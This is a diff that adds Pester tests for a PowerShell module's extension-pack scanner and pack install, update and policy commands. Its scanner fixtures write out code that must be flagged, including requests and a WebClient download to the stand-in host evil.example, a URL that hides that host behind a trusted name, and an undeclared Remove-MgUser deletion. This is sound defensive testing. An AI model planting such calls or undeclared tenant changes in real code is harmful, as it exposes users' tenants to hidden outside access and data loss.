@@ -148,10 +148,23 @@ Describe 'Maester Pack content scan' {
         @{ Case = 'an undeclared network host'; Code = 'UndeclaredNetwork'; Text = "function Get-CntExtra { Invoke-RestMethod -Uri 'https://evil.example/x' }" }
         @{ Case = 'an undeclared host followed by -UserAgent'; Code = 'UndeclaredNetwork'; Text = "function Get-CntExtra { Invoke-RestMethod -Uri 'https://evil.example/x' -UserAgent 'agent' }" }
         @{ Case = 'an undeclared host followed by a switch'; Code = 'UndeclaredNetwork'; Text = "function Get-CntExtra { Invoke-RestMethod -Uri 'https://evil.example/x' -UseBasicParsing }" }
+        @{ Case = 'a declared host used as a user name before another host'; Code = 'UndeclaredNetwork'; Text = "function Get-CntExtra { Invoke-RestMethod -Uri 'https://admin.googleapis.com:443@evil.example/x' }" }
+        @{ Case = 'a .NET HttpClient'; Code = 'DirectNetwork'; Text = "function Get-CntExtra { [Net.Http.HttpClient]::new().GetStringAsync('https://evil.example/x') }" }
+        @{ Case = 'a .NET WebClient made with New-Object'; Code = 'DirectNetwork'; Text = "function Get-CntExtra { (New-Object system.net.webclient).DownloadString('https://evil.example/x') }" }
+        @{ Case = 'a request method set at run time'; Code = 'UndeclaredTenantWrite'; Text = "function Get-CntExtra { param(`$m) Invoke-MtGraphRequest -RelativeUri 'users' -Method `$m }" }
+        @{ Case = 'a Microsoft Graph command that changes the tenant'; Code = 'UndeclaredTenantWrite'; Text = "function Get-CntExtra { Remove-MgUser -UserId 'someone' }" }
     ) {
         $pack = Copy-SamplePack -Destination (Join-Path $TestDrive "scan-$Code-$([math]::Abs($Case.GetHashCode()))") -Edit { param($p) Set-Content -LiteralPath (Join-Path $p 'helpers/Get-CntExtra.ps1') -Value $Text }
         $result = Test-MtPack $pack
         @($result.Errors.Code) + @($result.Findings.Code) | Should -Contain $Code
+    }
+
+    It 'accepts a request to a declared host and a write that Uses.TenantWrites declares' {
+        $pack = Copy-SamplePack -Destination (Join-Path $TestDrive 'declared-reach') -Edit { param($p) Set-Content -LiteralPath (Join-Path $p 'helpers/Get-CntExtra.ps1') -Value "function Get-CntExtra { param(`$m) Invoke-RestMethod -Uri 'https://admin.googleapis.com:443/x'; Invoke-MtGraphRequest -RelativeUri 'users' -Method `$m; Remove-MgUser -UserId 'someone' }" }
+        Set-Manifest -Pack $pack -Change { param($m) $m.Uses.Network = @('admin.googleapis.com'); $m.Uses | Add-Member TenantWrites @('Removes users') }
+        $result = Test-MtPack $pack
+        $result.Errors | Should -BeNullOrEmpty
+        $result.Findings.Code | Should -Not -Contain 'DirectNetwork'
     }
 
     It 'rates a binary file High' {
@@ -511,5 +524,88 @@ Describe 'New-MtPack' {
         InModuleScope Maester -Parameters @{ Range = $manifest.RequiresMaester; Version = $version } {
             Test-MtVersionRange -Range $Range -Version $Version | Should -BeTrue
         }
+    }
+}
+
+Describe 'Pack updates, config and policy' {
+    BeforeEach {
+        $script:root = Join-Path $TestDrive ([guid]::NewGuid().ToString('n'))
+        Reset-PackState -Root $script:root
+        Push-Location (Join-Path $script:root 'project')
+    }
+    AfterEach { Pop-Location }
+
+    It 'loads a pack whose helper folder also holds a .psm1, taking only its .ps1 helpers' {
+        $pack = Copy-SamplePack -Destination (Join-Path $script:root 'psm1') -Edit { param($p) Set-Content -LiteralPath (Join-Path $p 'helpers/Extra.psm1') -Value 'function Get-CntExtra { 1 }' }
+        $rows = @(Invoke-MtTest -Path $pack)
+        ($rows | Where-Object Id -EQ 'MP.CNT.1002').Result | Should -Be 'Passed'
+        ($rows | Where-Object ReasonCode -EQ 'PackLoadFailed') | Should -BeNullOrEmpty
+    }
+
+    It 'runs only the tests under a folder, not those of a sibling folder that starts with its name' {
+        $pack = Copy-SamplePack -Destination (Join-Path $script:root 'sibling') -Edit {
+            param($p)
+            $null = New-Item -Path (Join-Path $p 'tests-extra') -ItemType Directory
+            Move-Item -LiteralPath (Join-Path $p 'tests/Test.MP.CNT.1002.ps1') -Destination (Join-Path $p 'tests-extra')
+            Move-Item -LiteralPath (Join-Path $p 'tests/Test.MP.CNT.1002.md') -Destination (Join-Path $p 'tests-extra')
+            Copy-Item -LiteralPath (Join-Path $p 'tests/suite.json') -Destination (Join-Path $p 'tests-extra')
+            Set-Manifest -Pack $p -Change { param($m) $m.Suites = @('tests', 'tests-extra') }
+        }
+        $ids = @(Invoke-MtTest -Path (Join-Path $pack 'tests')).Id
+        $ids | Should -Contain 'MP.CNT.1001'
+        $ids | Should -Not -Contain 'MP.CNT.1002'
+    }
+
+    It 'keeps Enabled and the Version range of a config entry when the pack is recorded again' {
+        Set-Content -LiteralPath 'maester-config.json' -Value '{ "Packs": [ { "Id": "contoso.sample", "Enabled": false, "Version": "^1.0", "Note": "kept" } ] }'
+        $null = Install-MtPack $script:fixture -NonInteractive 6>$null
+        $entry = (Get-Content -LiteralPath 'maester-config.json' -Raw | ConvertFrom-Json).Packs | Where-Object Id -EQ 'contoso.sample'
+        $entry.Enabled | Should -BeFalse
+        $entry.Version | Should -Be '^1.0'
+        $entry.Note | Should -Be 'kept'
+        $entry.Source | Should -Be $script:fixture
+    }
+
+    It 'leaves a pack whose files have not changed as it is, without asking again' {
+        $null = Install-MtPack $script:fixture -NonInteractive 6>$null
+        $before = (Get-Content -LiteralPath 'maester-packs.lock.json' -Raw | ConvertFrom-Json).Packs[0].ApprovedAt
+        Mock -ModuleName Maester Show-MtPackApproval { throw 'asked again' }
+        $result = Update-MtPack -NonInteractive 6>$null
+        $result.Status | Should -Be 'UpToDate'
+        Should -Invoke -ModuleName Maester Show-MtPackApproval -Times 0 -Exactly
+        (Get-Content -LiteralPath 'maester-packs.lock.json' -Raw | ConvertFrom-Json).Packs[0].ApprovedAt | Should -Be $before
+    }
+
+    It 'changes nothing with -WhatIf on <Name>' -ForEach @(
+        @{ Name = 'Install-MtPack'; Command = { Install-MtPack $script:fixture -NonInteractive -WhatIf 6>$null } }
+        @{ Name = 'Update-MtPack'; Command = { Update-MtPack -NonInteractive -WhatIf 6>$null } }
+        @{ Name = 'Uninstall-MtPack'; Command = { Uninstall-MtPack contoso.sample -WhatIf } }
+        @{ Name = 'Restore-MtPack'; Command = { Restore-MtPack -WhatIf } }
+    ) {
+        if ($Name -ne 'Install-MtPack') { $null = Install-MtPack $script:fixture -NonInteractive 6>$null }
+        $lockBefore = if (Test-Path 'maester-packs.lock.json') { Get-Content -LiteralPath 'maester-packs.lock.json' -Raw } else { $null }
+        $configBefore = Get-Content -LiteralPath 'maester-config.json' -Raw
+        { & $Command } | Should -Not -Throw
+        $(if (Test-Path 'maester-packs.lock.json') { Get-Content -LiteralPath 'maester-packs.lock.json' -Raw } else { $null }) | Should -Be $lockBefore
+        Get-Content -LiteralPath 'maester-config.json' -Raw | Should -Be $configBefore
+    }
+
+    It 'reads a MaximumRisk of any case' {
+        $policy = InModuleScope Maester { Get-MtPackPolicy -RunConfig ([pscustomobject]@{ PackPolicy = [pscustomobject]@{ MaximumRisk = 'low' } }) }
+        $policy.MaximumRisk | Should -Be 'Low'
+        InModuleScope Maester -Parameters @{ Policy = $policy } {
+            param($Policy)
+            Test-MtPackPolicy -Policy $Policy -PackId contoso.sample -Publisher contoso -Risk Low | Should -BeNullOrEmpty
+            Test-MtPackPolicy -Policy $Policy -PackId contoso.sample -Publisher contoso -Risk Medium | Should -Match 'up to Low risk'
+        }
+    }
+
+    It 'accepts a Guid in the manifest and refuses one that is not a GUID' {
+        $read = InModuleScope Maester -Parameters @{ Path = (Resolve-Path "$PSScriptRoot/../../../packs/zero-trust-assessment").Path } { param($Path) Read-MtPackManifest -Path $Path -Official }
+        $read.Errors | Should -BeNullOrEmpty
+        @($read.Warnings | Where-Object { $_ -match 'Guid' }) | Should -BeNullOrEmpty
+        $pack = Copy-SamplePack -Destination (Join-Path $script:root 'guid') -Edit { param($p) Set-Manifest -Pack $p -Change { param($m) $m | Add-Member Guid 'not-a-guid' } }
+        $read = InModuleScope Maester -Parameters @{ Path = $pack } { param($Path) Read-MtPackManifest -Path $Path }
+        ($read.Errors | ForEach-Object Message) -join ' ' | Should -Match 'Guid must be a GUID'
     }
 }
